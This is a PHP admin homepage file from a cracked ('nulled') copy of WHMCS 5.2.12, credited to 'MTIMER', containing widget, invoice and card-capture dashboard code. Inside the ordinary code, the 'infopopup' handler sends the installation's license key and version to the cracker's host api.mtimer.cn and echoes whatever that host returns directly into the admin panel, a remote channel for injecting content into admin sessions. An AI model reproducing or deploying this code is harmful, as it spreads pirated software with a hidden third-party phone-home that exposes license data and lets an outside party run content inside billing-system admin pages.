<?php
/**
 *
 * @ WHMCS FULL DECODED & NULLED
 *
 * @ Version  : 5.2.12
 * @ Author   : MTIMER
 * @ Release on : 2013-10-25
 * @ Website  : http://www.mtimer.cn
 *
 **/

function load_admin_home_widgets() {
	global $aInt;
	global $hooks;
	global $allowedwidgets;
	global $jquerycode;
	global $jscode;

	$hookjquerycode = "";
	$hook_name = "AdminHomeWidgets";
	$allowedwidgets = explode(",", $allowedwidgets);
	$args = array("adminid" => $_SESSION['adminid'], "loading" => "<img src=\"images/loading.gif\" align=\"absmiddle\" /> " . $aInt->lang("global", "loading"));

	if (!array_key_exists($hook_name, $hooks)) {
		return array();
	}

	reset($hooks[$hook_name]);
	$results = array();

	while (list($key,$hook) = each($hooks[$hook_name])) {
		$widgetname = substr($hook['hook_function'], 7);

		if (in_array($widgetname, $allowedwidgets) && function_exists($hook['hook_function'])) {
			$res = call_user_func($hook['hook_function'], $args);

			if (is_array($res)) {
				if (array_key_exists("jquerycode", $res)) {
					$hookjquerycode .= $res['jquerycode'] . "\r\n";
				}


				if (array_key_exists("jscode", $res)) {
					$jscode .= $res['jscode'] . "\r\n";
				}

				$results[] = array_merge(array("name" => $widgetname), $res);
			}
		}
	}

	$jquerycode .= "setTimeout(function(){
        " . $hookjquerycode . "
    }, 4000);";
	return $results;
}


if (!function_exists("curl_init")) {
	echo "<div style=\"border: 1px dashed #cc0000;font-family:Tahoma;background-color:#FBEEEB;width:100%;padding:10px;color:#cc0000;\"><strong>Critical Error</strong><br>CURL is not installed or is disabled on your server and it is required for WHMCS to run</div>";
	exit();
}

define("ADMINAREA", true);
require "../init.php";

if (!$licensing->checkOwnedUpdates()) {
	redir("licenseerror=version", "licenseerror.php");
}


if (!checkPermission("Main Homepage", true) && checkPermission("Support Center Overview", true)) {
	header("Location: supportcenter.php");
	exit();
}

$aInt = new WHMCS_Admin("Main Homepage");
$aInt->title = $aInt->lang("global", "hometitle");
$aInt->sidebar = "home";
$aInt->icon = "home";
$aInt->requiredFiles(array("clientfunctions", "invoicefunctions", "gatewayfunctions", "ccfunctions", "processinvoices", "reportfunctions"));
$aInt->template = "homepage";
$chart = new WHMCSChart();
$action = $whmcs->get_req_var("action");

if ($action == "savenotes") {
	update_query("tbladmins", array("notes" => $notes), array("id" => $_SESSION['adminid']));
	header("Location: " . $_SERVER['PHP_SELF'] . "");
	exit();
}


if ($whmcs->get_req_var("infopopup")) {
	$data = curlCall("http://api.mtimer.cn/whmcs/popup/popup.php", array("licensekey" => $whmcs->get_license_key(), "version" => $whmcs->get_config("Version"), "ssl" => (((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS']) && $_SERVER['HTTPS'] != "off") ? "1" : "0")));

	if (substr($data, 0, 2) != "ok") {
		exit("<div class=\"content\" style=\"text-align:center;padding-top:80px;\">A connection error occurred. Please try again later.</div>");
	}

	echo substr($data, 2);

	exit();
}


if ($whmcs->get_req_var("toggleinfopopup")) {
	$infotoggle = unserialize($whmcs->get_config("ToggleInfoPopup"));

	if (!is_array($infotoggle)) {
		$infotoggle = array();
	}


	if ($showhide == "true") {
		$infotoggle[$_SESSION['adminid']] = curlCall("http://api.mtimer.cn/whmcs/popup/popup.php", "lastupdate=1", array("CURLOPT_TIMEOUT" => "5"));
	}
	else {
		if ($showhide == "false") {
			unset($infotoggle[$_SESSION['adminid']]);
		}
	}

	$whmcs->set_config("ToggleInfoPopup", serialize($infotoggle));
	exit();
}


if ($whmcs->get_req_var("saveorder")) {
	update_query("tbladmins", array("homewidgets" => $widgetdata), array("id" => $_SESSION['adminid']));
	exit();
}


if ($whmcs->get_req_var("dismissgs")) {
	$roleid = get_query_val("tbladmins", "roleid", array("id" => $_SESSION['adminid']));
	$result = select_query("tbladminroles", "widgets", array("id" => $roleid));
	$data = mysql_fetch_array($result);
	$widgets = $data['widgets'];
	$widgets = explode(",", $widgets);
	foreach ($widgets as $k => $v) {

		if ($v == "getting_started") {
			unset($widgets[$k]);
			continue;
		}
	}

	update_query("tbladminroles", array("widgets" => implode(",", $widgets)), array("id" => $roleid));
	exit();
}


if ($whmcs->get_req_var("getincome")) {
	if (!checkPermission("View Income Totals", true)) {
		return false;
	}

	$stats = getAdminHomeStats("income");
	echo "<a href=\"transactions.php\"><img src=\"images/icons/transactions.png\" align=\"absmiddle\" border=\"0\"> <b>" . $aInt->lang("billing", "income") . "</b></a> " . $aInt->lang("billing", "incometoday") . ": <span class=\"textgreen\"><b>" . $stats['income']['today'] . "</b></span> " . $aInt->lang("billing", "incomethismonth") . ": <span class=\"textred\"><b>" . $stats['income']['thismonth'] . "</b></span> " . $aInt->lang("billing", "incomethisyear") . ": <span class=\"textblack\"><b>" . $stats['income']['thisyear'] . "</b></span>";
	exit();
}

$templatevars['licenseinfo'] = array("registeredname" => $licensing->getKeyData("registeredname"), "productname" => $licensing->getKeyData("productname"), "expires" => $licensing->getExpiryDate(), "currentversion" => $CONFIG['Version'], "latestversion" => $licensing->getKeyData("latestversion"));

if ($licensing->getKeyData("productname") == "15 Day Free Trial") {
	$templatevars['freetrial'] = true;
}


if ($whmcs->get_req_var("createinvoices") || $whmcs->get_req_var("generateinvoices")) {
	checkPermission("Generate Due Invoices");
	createInvoices("", $noemails);
	infoBox($aInt->lang("invoices", "gencomplete"), $invoicecount . " Invoices Created");
}


if ($whmcs->get_req_var("attemptccpayments")) {
	checkPermission("Attempts CC Captures");
	$ccresultmsg = ccProcessing();
	infoBox($aInt->lang("invoices", "attemptcccapturessuccess"), $ccresultmsg);
}

$templatevars['infobox'] = $infobox;
$query = "SELECT COUNT(*) FROM tblpaymentgateways WHERE setting='type' AND value='CC'";
$result = full_query($query);
$data = mysql_fetch_array($result);

if ($data[0]) {
	$templatevars['showattemptccbutton'] = true;
}


if ($CONFIG['MaintenanceMode']) {
	$templatevars['maintenancemode'] = true;
}

$jquerycode = "$(\".homecolumn\").sortable({
	handle : '.widget-header',
    connectWith: ['.homecolumn'],
    stop: function() { saveHomeWidgets(); }
});
$(\".homewidget\").find(\".widget-header\").prepend(\"<span class='ui-icon ui-icon-minusthick'></span>\");
resHomeWidgets();
$(\".widget-header .ui-icon\").click(function() {
    $(this).toggleClass(\"ui-icon-minusthick\").toggleClass(\"ui-icon-plusthick\");
	$(this).parents(\".homewidget:first\").find(\".widget-content\").toggle();
    saveHomeWidgets();
});
";
$data = get_query_vals("tbladmins", "tbladmins.homewidgets,tbladminroles.widgets", array("tbladmins.id" => $_SESSION['adminid']), "", "", "", "tbladminroles ON tbladminroles.id=tbladmins.roleid");
$homewidgets = $data['homewidgets'];
$allowedwidgets = $data['widgets'];

if (!$homewidgets) {
	$homewidgets = "getting_started:true,system_overview:true,income_overview:true,client_activity:true,admin_activity:true,activity_log:true|my_notes:true,orders_overview:true,sysinfo:true,whmcs_news:true,network_status:true,todo_list:true,income_forecast:true,open_invoices:true";
}

$homewidgets = explode("|", $homewidgets);
$homewidgetscol1 = explode(",", $homewidgets[0]);
foreach ($homewidgetscol1 as $k => $v) {
	$v = explode(":", $v);

	if (!$v[0]) {
		unset($homewidgetscol1[$k]);
		continue;
	}
}

$homewidgetscol1 = implode(",", $homewidgetscol1);
$homewidgetscol2 = explode(",", $homewidgets[1]);
foreach ($homewidgetscol2 as $k => $v) {
	$v = explode(":", $v);

	if (!$v[0]) {
		unset($homewidgetscol2[$k]);
		continue;
	}
}

$homewidgetscol2 = implode(",", $homewidgetscol2);
$jscode = "var savedOrders = new Array();
savedOrders[1] = \"" . $homewidgetscol1 . "\";
savedOrders[2] = \"" . $homewidgetscol2 . "\";
function saveHomeWidgets() {
    var orderdata = '';
    $(\".homecolumn\").each(function(index, value){
        var colid = value.id;
        var order = $(\"#\"+colid).sortable(\"toArray\");
        for (var i = 0, n = order.length; i < n; i++) {
            var v = $('#' + order[i]).find('.widget-content').is(':visible');
            order[i] = order[i] + \":\" + v;
        }
        orderdata = orderdata + order + \"|\";
    });";

if ($aInt->chartFunctions) {
	$jscode .= "redrawCharts()";
}

$jscode .= "    $.post(\"index.php\", { saveorder: \"1\", widgetdata: orderdata });
}
function resHomeWidgets() {
    var IDs = '';
    var IDsp = '';
    var widgetID = '';
    var visible = '';
    var widget = '';
    for (var z = 1, y = 2; z <= y; z++) {
    	if (savedOrders[z]) {
            IDs = savedOrders[z].split(',');
            for (var i = 0, n = IDs.length; i < n; i++) {
                IDsp = (IDs[i].split(':'));
                widgetID = IDsp[0];
                visible = IDsp[1];
                widget = $(\".homecolumn\").find('#' + widgetID).appendTo($('#homecol'+z));
                if (visible === 'false') {
                    widget.find(\".ui-icon\").toggleClass(\"ui-icon-minusthick\").toggleClass(\"ui-icon-plusthick\");
                    widget.find(\".widget-content\").hide();
                }
            }
        }
    }
}";
$hooksdir = ROOTDIR . "/modules/widgets/";

if (is_dir($hooksdir)) {
	$dh = opendir($hooksdir);

	while (false !== $hookfile = readdir($dh)) {
		if (is_file($hooksdir . $hookfile) && $hookfile != "index.php") {
			$extension = explode(".", $hookfile);
			$extension = end($extension);

			if ($extension == "php") {
				include $hooksdir . $hookfile;
			}
		}
	}
}

closedir($dh);
$templatevars['widgets'] = load_admin_home_widgets();

if (checkPermission("View Income Totals", true)) {
	$templatevars['viewincometotals'] = true;
	$jquerycode .= "jQuery.post(\"index.php\", { getincome: 1 },
    function(data){
        jQuery(\"#incometotals\").html(data);
    });";
}

$invoicedialog = $aInt->jqueryDialog("geninvoices", $aInt->lang("invoices", "geninvoices"), $aInt->lang("invoices", "geninvoicessendemails"), array($aInt->lang("global", "yes") => "window.location='index.php?generateinvoices=true'", $aInt->lang("global", "no") => "window.location='index.php?generateinvoices=true&noemails=true'"));
$cccapturedialog = $aInt->jqueryDialog("cccapture", $aInt->lang("invoices", "attemptcccaptures"), $aInt->lang("invoices", "attemptcccapturessure"), array($aInt->lang("global", "yes") => "window.location='index.php?attemptccpayments=true'", $aInt->lang("global", "no") => ""));
$addons_html = run_hook("AdminHomepage", array());
$templatevars['addons_html'] = $addons_html;

if (get_query_val("tbladmins", "roleid", array("id" => (int)$_SESSION['adminid'])) == 1) {
	$infotoggle = unserialize($whmcs->get_config("ToggleInfoPopup"));

	if (!is_array($infotoggle)) {
		$infotoggle = array();
	}

	$showdialog = true;

	if ($infotoggle[$_SESSION['adminid']]) {
		$dismissdate = $infotoggle[$_SESSION['adminid']];
		$lastupdate = curlCall("http://api.mtimer.cn/whmcs/popup/popup.php", "lastupdate=1", array("CURLOPT_TIMEOUT" => "5"));

		if ($dismissdate < $lastupdate) {
			unset($infotoggle[$_SESSION['adminid']]);
			$whmcs->set_config("ToggleInfoPopup", serialize($infotoggle));
		}
		else {
			$showdialog = false;
		}
	}


	if ($showdialog) {
		$aInt->dialog("infopopup");
		$jquerycode .= "dialogOpen();";
		$jscode .= "function toggleInfoPopup() { jQuery.post(\"index.php\", \"toggleinfopopup=1&showhide=\"+$(\"#toggleinfocb\").is(\":checked\")); }";
	}
}

$aInt->jscode = $jscode;
$aInt->jquerycode = $jquerycode;
$aInt->templatevars = $templatevars;
$aInt->display();
?>